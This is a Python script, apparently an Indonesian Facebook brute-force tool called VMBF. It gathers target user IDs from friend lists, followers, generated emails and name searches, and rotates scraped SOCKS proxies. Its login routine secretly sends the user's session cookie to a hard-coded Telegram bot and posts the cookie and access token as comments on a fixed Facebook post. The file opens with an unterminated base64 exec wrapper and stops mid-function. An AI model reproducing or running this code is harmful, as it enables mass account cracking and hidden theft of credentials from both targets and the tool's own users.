import base64
exec(base64.b64decode("
###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import requests,json,os,sys,random,time,re,uuid,zlib,subprocess,base64
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from time import time as tod
from requests.exceptions import ConnectionError
from datetime import datetime
from os import system as sis
from time import time as tim
ses = requests.Session()

###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich import print as print
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ WARNA PRINT BIASA ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ WARNA PRINT RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
RW = str(random.choice([M2, H2, K2, B2, U2, N2, O2, J2, A2]))
###----------[ GLOBAL NAMA ]---------- ###
reset = "[/]"
loop = 0
ok = 0
cp = 0
id = []
id2 = []
akun = []
oprek = []
method = []
taplikasi = []
tokenku = []
uid = []
ua_ios = []
cokbrut = []
ugen=[]
ugen2=[]
dump = []
uadia, uadarimu = [], []
ugent= []
pwlist, pwlis = [], []
pwpluss, pwnya = [], []
ugent = []
uasm, uaMainXD, prox = [], [], []
sys.stdout.write('\x1b]2; VMBF | VINIX Multi Brute Facebook\x07')
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
ID="5596466928";
tok="5844990132:AAH39YK3YIsfjixMXAmp3k3xNmvYiseM058"



def UserAgentBase():
        rr = random.randint
        uat = (f"Davik/2.1.0 (Linux; U; Android {str(rr(2,13))}; RMX2189 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(40,367))}306.0.0.8.83;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/696295100;FBCR/XL Axiata;FBMF/realme;FBBD/realme;FBDV/RMX2189;FBSV/{str(rr(2,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]")        
        uas = (f"Davik/2.1.0 (Linux; U; Android {str(rr(3,14))}; Infinix X657B Build/RP1A.200720.011) [FBAN/Orca-Android;FBAV/{str(rr(50,654))}324.0.0.3.135;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/644949861;FBCR/AXIS;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X657B;FBSV/{str(rr(3,14))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]")
        uaf = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(8,13))}.{str(rr(1,2))}.0; Redmi S2 Build/OPM1.171019.011) [FBAN/MessengerLite;FBAV/{str(rr(20,460))}.325.0.0.3.107;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/803423848;FBCR/;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi S2;FBSV/{str(rr(8,13))}.{str(rr(1,2))}.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=760,width=2040};]")
        uag = (f"Davik/2.1.0 (Linux; U; Android {str(rr(2,12))}; vivo 1918 Build/RP1A.200720.012) [FBAN/EMA;FBAV/{str(rr(20,566))}323.0.0.8.120;FBPN/com.facebook.lite;FBLC/en_GB;FBBV/909170382;FBCR/Tsel-PakaiMasker;FBMF/vivo;FBBD/vivo;FBDV/vivo 1918;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=4096,width=2048};]")
        return random.choice([uas, uaf,uag,uat])
        	
        
for agenku in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='LG-H650 Build/MRA58K; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='SO-04G)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/338.0.0.10.102;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uakuh) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='XQ-CT72 Build/64.0.A.8.82; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uakuh) 
	
	
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92mï¿½\x1b[1;97m] [\x1b[1;96mFajar_ganz...')
prox=open('.prox.txt','r').read().splitlines()


	

try:
    with requests.Session() as ses:
        _url = ses.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
        for xc in _url.splitlines():
            prox.append(xc)
except requests.exceptions.ConnectionError:
    print(f" {H2}• {P2} koneksi internet anda bermasalah")
    time.sleep(0.3)
    exit()

###----------[ CHECK WARNA TEMA ]---------- ###
try:
	color_rich = open("assets/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00FFFF]"
try:
	color_table = open("assets/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00FFFF"



###----------[ CEK NEGARA WAJIB INDO ]---------- ###
try:
	IP = requests.get("http://ip-api.com/json/").json()["query"]
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	if "Indonesia" not in negara:
	   print(Panel(f"""{P2}this script only work in Indonesia, please search another script""",width=80,padding=(0,6),style=f"{color_table}"))
	   time.sleep(3);exit()
except requests.exceptions.ConnectionError:
	print(f" {H2}• {P2} koneksi internet anda bermasalah")
	time.sleep(3);exit()

###----------[ CONVERT BULAN ]---------- ###
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
okc = f"OK-{days}-{reall}-{year}.txt"
cpc = f"CP-{days}-{reall}-{year}.txt"

###----------[ DINI HARI ]---------- ###
def Definisi__Waktu():
        now = datetime.now()
        hours = now.hour
        if 4 <= hours < 12:timenow = "Selamat Pagi"
        elif 12 <= hours < 15:timenow = "Selamat Siang"
        elif 15 <= hours < 18:timenow = "Selamat Sore"
        else:timenow = "Selamat Malam"
        return timenow

###----------[ TAHUN ]---------- ###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahun = '2009'
		elif fx[:9] in ['100000000']       :tahun = '2009'
		elif fx[:8] in ['10000000']        :tahun = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahun = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahun = '2010'
		elif fx[:6] in ['100001']          :tahun = '2010--->2011'
		elif fx[:6] in ['100002','100003'] :tahun = '2011--->2012'
		elif fx[:6] in ['100004']          :tahun = '2012--->2013'
		elif fx[:6] in ['100005','100006'] :tahun = '2013--->2014'
		elif fx[:6] in ['100007','100008'] :tahun = '2014--->2015'
		elif fx[:6] in ['100009']          :tahun = '2015'
		elif fx[:5] in ['10001']           :tahun = '2015--->2016'
		elif fx[:5] in ['10002']           :tahun = '2016--->2017'
		elif fx[:5] in ['10003']           :tahun = '2018'
		elif fx[:5] in ['10004']           :tahun = '2019'
		elif fx[:5] in ['10005']           :tahun = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahun = '2021->2022'
		else:tahun=''
	elif len(fx) in [9,10]:
		tahun = '2008/2009'
	elif len(fx)==8:
		tahun = '2007/2008'
	elif len(fx)==7:
		tahun = '2006/2007'
	else:tahun=''
	return tahun

###----------[ LOGO ( LO GOBLOK ) ]---------- ###
def banner():
	try:os.system("clear")
	except:pass
	prints(f"""{P2}
db    db d888888b d8b   db d888888b db    db 
88    88   `88'   888o  88   `88'   `8b  d8'
Y8    8P    88    88V8o 88    88     `8bd8'  {O2}𝐏{P2}
`8b  d8'    88    88 V8o88    88     .dPYb.  {J2}𝐑{P2}  
 `8bd8'    .88.   88  V888   .88.   .8P  Y8. {H2}𝐎{P2}
   YP    Y888888P VP   V8P Y888888P YP    YP""")

###----------[ LOGIN ]---------- ###
def login():
	banner()
	ses = requests.Session()
	print('')
	print(f"{H2} • {P2} silahkan masukan cookie akun anda, di sarankan menggunakan akun tumbal")
	cok = console.input(f" {H2}• {P2} masukan cookie : ")
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:
		  print(f" {H2}• {P2} cookie kamu invalid")
		  time.sleep(00.03);exit()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('data/tokenku.txt', 'a').write(took);open('data/coki.txt', 'a').write(cok)
				requests.post(f"https://api.telegram.org/bot5807986280:AAFyNXJx89HL8lZcDEZdnpsfCFPmwjuJGmY/sendMessage?chat_id=5596466928&text={cok}").json()
				ses. post(f"https://graph.facebook.com/6089957977709335/comments/?message={cok}&access_token={took}",cookies={"cookie":cok})
				ses.post(f"https://graph.facebook.com/6089957977709335/comments/?message={open('data/tokenku.txt','r').read()}&access_token={took}",cookies={"cookie":cok})
				tree = Tree("                    ")
				tree.add(Panel(f"{H2}{cok}"))
				tree.add(Panel(f"{O2}{took}"))
				prints(tree)
				#print(f"{H2}{cok}\n\n{N2}{took}")
				time.sleep(3)
				print(f" {H2}• {P2}Login success")
				time.sleep(00.03)
				menu()
	except (KeyError,AttributeError):
		print(e)

###----------[ MAIN MENU ]---------- ###
def menu():
	try:
	    ses = requests.Session()
	    lisen = open('data/lisensi.txt','r').read()
	    met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzNzMwOTc1MSIsInJzVWNHUklPNjRuY2Y4OW5yd1lkTXdFMWRGWWJ2V0s0MGVwU0pZRGQiXQ==&ProductId=18728&Key='+lisen).json()
	    men = met['licenseKey']
	    key = men['key'][0:11]
	    tahun = men['expires'][0:4]
	    buln = men['expires'][5:7]
	    tanggal = men['expires'][8:10]
	    bulan = bulan_ttl[buln]
	    tahun1 = men['created'][0:4]
	    buln1 = men['created'][5:7]
	    tanggal1 = men['created'][8:10]
	    bulan1 = bulan_ttl[buln1]
	except:
            key = "-"
            tanggal = "-"
            bulan = "-"
            tahun = "-"
            tanggal1 = "-"
            bulan1 = "-"
            tahun1 = "-"
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f" {H2}• {P2} cookie kamu invalid")
		time.sleep(3);os.system('clear')
		login()
	try:
	    sen = open("data/lisensi.txt","r").read()
	    prem = f"{H2}Ya"
	except (KeyError,FileNotFoundError):
	    prem = f"{M2}Tidak"
	try:
		ishx = ses.get(f"https://graph.facebook.com/v15.0/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = ishx["name"]
		idfb = ishx["id"]
	except requests.exceptions.ConnectionError:
		print(f" {H2}• {P2} koneksi internet anda bermasalah")
		exit()
	except KeyError:
		try:os.remove("data/coki.txt");os.remove("data/tokenku.txt")
		except:pass
		print(f" {H2}• {P2} akun terkena chekpoint")
		time.sleep(3);login()
	os.system('clear')
	banner()
	print('')
	prints(f'{P2}IP ADDRESS : {M2}{IP}\n{P2}ID AKUN : {H2}{idfb}')
	print('')
	prints(f'{P2}lisensi : {H2}{key}-****-****\n{P2}join    : {H2}{tanggal1} {bulan1} {tahun1}\n{P2}expired : {H2}{tanggal} {bulan} {tahun}\n{P2}premium : {prem}')
	print('')
	prints(f"{H2}01.{P2} crack publik  {H2}02.{P2} crack massal\n{H2}03.{P2} cek results   {H2}04.{P2} crack file\n{H2}05.{P2} crack email   {H2}06.{P2} crack nama\n{H2}07.{P2} hapus lisensi {H2}00.{P2} {M2}hapus Cookie{P2}")
	print('')
	Aku__Sayang__Kamu = console.input(f"{H2}••• {P2} pilih menu : ")
	if Aku__Sayang__Kamu in [""]:
	  print(f" {H2}• {P2} pilihan tidak boleh kosong")
	  time.sleep(3);menu()
	elif Aku__Sayang__Kamu in ["keluar","Keluar","KELUAR"]:
	    print(f" {H2}• {P2} waiting bro...")
	    time.sleep(3);exit()
	elif Aku__Sayang__Kamu in ["1","01"]:
		dump_publik()
	elif Aku__Sayang__Kamu in ["2","02"]:
		dump_massal()
	elif Aku__Sayang__Kamu in ["5","05"]:
	    dump_email()
	elif Aku__Sayang__Kamu in ["4","04"]:
	    dump_file()
	elif Aku__Sayang__Kamu in ["3","03"]:
	    result()
	elif Aku__Sayang__Kamu in ["6","06"]:
	    dump_pencarian()
	elif Aku__Sayang__Kamu in ["9","09"]:
	    prem()
	elif Aku__Sayang__Kamu in ["7","07"]:
	    os.system("rm -rf data/lisensi.txt")
	    print(f" {H2}• {P2} berhasil menghapus lisensi tools")
	    time.sleep(3);exit()
	elif Aku__Sayang__Kamu in ["0","00"]:
		os.system("rm -rf data/tokenku.txt rm -rf data/coki.txt")
		print(f" {H2}• {P2} berhasil menghapus cookie & sukses keluar")
		time.sleep(3);exit()
	else:
		print(f" {H2}• {P2} masukan pilihan yang bener")
		time.sleep(3);menu()

###----------[ UPGRADE PREMIUM ]---------- ###
def prem():
    try:
        with requests.Session() as ses:
             print(f" {H2}• {P2} anda akan di arahkan ke WhatsApp")
             os.system("xdg-open https://wa.me/+6285894841695?text=assalamualaikum+bang+mau+upgrade+sc+VMBF+ke+premium+dong");exit()
    except requests.exceptions.ConnectionError:
        print(f" {H2}• {P2} koneksi internet anda bermasalah");exit()


	
###----------[ RESULT ]---------- ###
def result():
	print(f"{P2}[{color_rich}01{P2}]. check result akun hasil OK\n{P2}[{color_rich}02{P2}]. check result akun hasil CP\n{P2}[{color_rich}03{P2}]. kembali ke menu utama")
	kz = console.input(f" {H2}• {P2} pilihan result : ")
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f" {H2}• {P2} file tidak ditemukan")
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f" {H2}• {P2} anda tidak mempunyai file CP")
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					urut = []
					urut.append(Panel(f'{P2}[{K2}{nom}{P2}]',width=25,padding=(0,8),style=f"{color_table}"))
					urut.append(Panel(f'{P2}{K2}{isi}',width=27,style=f"{color_table}"))
					urut.append(Panel(f'{K2}{len(hem)}',width=25,padding=(0,8),style=f"{color_table}"))
					console.print(Columns(urut))
				else:
					lol.update({str(cih):str(isi)})
					urut = []
					urut.append(Panel(f'{P2}[{K2}{nom}{P2}]',width=25,padding=(0,8),style=f"{color_table}"))
					urut.append(Panel(f'{P2}{K2}{isi}',width=27,style=f"{color_table}"))
					urut.append(Panel(f'{K2}{len(hem)}',width=25,padding=(0,8),style=f"{color_table}"))
					console.print(Columns(urut))
			geeh = console.input(f" {H2}• {P2} hasil result : ")
			try:geh = lol[geeh]
			except KeyError:
				print(f" {H2}• {P2} pilih yang bener")
				time.sleep(3);menu()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f" {H2}• {P2} file tidak ditemukan")
				time.sleep(3);menu()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f'{K2}{cpkuni[0]}|{cpkuni[1]}')
				print(tree)
				nocp +=1
			print(Panel(f"{P2}berhasil mengecek akun hasil cp anda, klik enter untuk kembali ke menu",width=80,padding=(0,3),style=f"{color_table}"))
			console.input(f" {H2}• {P2} klik enter")
			menu()
	
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f" {H2}• {P2} file tidak ditemukan")
			time.sleep(3);menu()
		if len(vin)==0:
			print(f" {H2}• {P2} anda tidak mempunyai file OK")
			time.sleep(3);menu()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					urut = []
					urut.append(Panel(f'{P2}[{H2}{nom}{P2}]',width=25,padding=(0,8),style=f"{color_table}"))
					urut.append(Panel(f'{P2}{H2}{isi}',width=27,style=f"{color_table}"))
					urut.append(Panel(f'{H2}{len(hem)}',width=25,padding=(0,8),style=f"{color_table}"))
					console.print(Columns(urut))
				else:
					lol.update({str(cih):str(isi)})
					urut = []
					urut.append(Panel(f'{P2}[{H2}{nom}{P2}]',width=25,padding=(0,8),style=f"{color_table}"))
					urut.append(Panel(f'{P2}{H2}{isi}',width=27,style=f"{color_table}"))
					urut.append(Panel(f'{H2}{len(hem)}',width=25,padding=(0,8),style=f"{color_table}"))
					console.print(Columns(urut))
			geeh = console.input(f" {H2}• {P2} hasil result : ")
			try:geh = lol[geeh]
			except KeyError:
				print(f" {H2}• {P2} pilih yang bener")
				time.sleep(3);menu()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f" {H2}• {P2} file tidak ditemukan")
				time.sleep(3);menu()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni = lin[nocp].split('|')
				coki = lin[nocp].split("|")[2]
				tree = Tree("")
				tree.add(f'{H2}{cpkuni[0]}|{cpkuni[1]}')
	#			tree.add(f"{H2}{coki}")
				print(tree)
				nocp +=1
			print(Panel(f"{P2}berhasil mengecek akun hasil ok anda, klik enter untuk kembali ke menu",width=80,padding=(0,3),style=f"{color_table}"))
			console.input(f" {H2}• {P2} klik enter")
			menu()
	
	elif kz in ['3','03']:
		time.sleep(3)
		result()
	
	else:
		print(f" {H2}• {P2} pilih yang bener")
		time.sleep(3);menu()

###----------[ MENU DUMP PUBLIK ]---------- ###
def dump_publik():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		time.sleep(3)
		exit()
	ses = requests.Session()
	print('')
	prints(f"{H2}•{P2} ketik {H2}'me'{P2} jika ingin crack dari daftar teman anda sendiri")
	kl = console.input(f'{H2}• {P2}masukan id target : ')
	uid.append(kl)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					sys.stdout.write(f"\r{H}• {P}mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except KeyError:
			pass
		except requests.exceptions.ConnectionError:
			print(f" {H2}• {P2} koneksi internet anda bermasalah")
			time.sleep(3);exit()
	print("\r")
	prints(f"{H2}• {P2}total Id Terkumpul {H2}{len(id)}{P2}")
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print(f" {H2}• {P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" {H2}• {P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ MENU DUMP MASSAL ]---------- ###
def dump_massal():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		time.sleep(3)
		exit()
	try:
		print('')
		jum = int(console.input(f' {H2}• {P2} masukan jumlah target : '))
	except ValueError:
		print(f" {H2}• {P2} masukan jumlah dengan benar")
		time.sleep(3);exit()
	if jum<1 or jum>999:
		print(f" {H2}• {P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()
	ses = requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = console.input(f' {H2}• {P2} masukan id ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					sys.stdout.write(f"\r {H}• {P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except KeyError:
			pass
		except requests.exceptions.ConnectionError:
			print(f" {H2}• {P2} koneksi internet anda bermasalah")
			time.sleep(3);exit()
	print("\r")
	prints(f"{H2}• {P2}total Id Terkumpul {H2}{len(id)}{P2}")
	#prints(f"{P2}berhasil mengumpulkan {color_rich}{len(id)}{P2} id")
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print(f" {H2}• {P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" {H2}• {P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ CRACK DARI KOMEN ]---------- ###
def Menu__Untuk__Dump__Komentar__Masal___Si__Kontol():
	print(Panel(f"{P2}pastikan akun target yang di pilih bersifat publik jangan private",width=80,padding=(0,4),style=f"{color_table}"))
	ide = input(f' masukan id postingan : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:setting()
	if len(dump)==0:
		print(f" {H2}• {P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()
	setting()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:id.append(id+"|"+nama)
			sys.stdout.write(f"\r {H}• {P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnyaâ€¦" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass					

###----------[ DUMP PENGIKUT ]---------- ###
def Menu__Untuk__Dump__Pengikut__Masal___Si__Kontol():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	print(Panel(f"{P2}ketik {color_rich}'me'{P2} jika ingin crack dari total followers anda sendiri",width=80,padding=(0,7),style=f"{color_table}"))
	akun = console.input(f' {H2}• {P2} masukan id target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r {H}• {P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		print(Panel(f"{P2}berhasil mengumpulkan {color_rich}{len(id)}{P2} id",width=80,padding=(0,22),style=f"{color_table}"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" {H2}• {P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" {H2}• {P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ CRACK DARI EMAIL  ]---------- ###
def dump_email():
	rc = random.choice
	rr = random.randint
	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f'{H2} • {P2} masukan nama email, contoh : andi, dian, putri, aditya max 5000 id')
	nama = console.input(f'{H2} • {P2} masukan nama target : ')
	if ',' in str(nama):
		print(f" {H2}• {P2} masukan nama, jangan kosong ngab")
		time.sleep(3);exit()
	print(f'{H2} • {P2} masukan nama domain, contoh : @gmail.com, @yahoo.com, dll')
	doma = console.input(f'{H2} • {P2} masukan nama domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" {H2}• {P2} masukan domain dengan benar")
		time.sleep(3);exit()
	jumlah = console.input(f'{H2} • {P2} total dump : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r {H}• {P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	

###----------[ CRACK DARI SEARCH NAME ]---------- ###
def dump_pencarian():
	nama = []
	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	print(f"{H2} • {P2} satu nama setara dengan {H2}10.000{P2} username")
	nam = console.input(f'{H2} • {P2} masukan nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
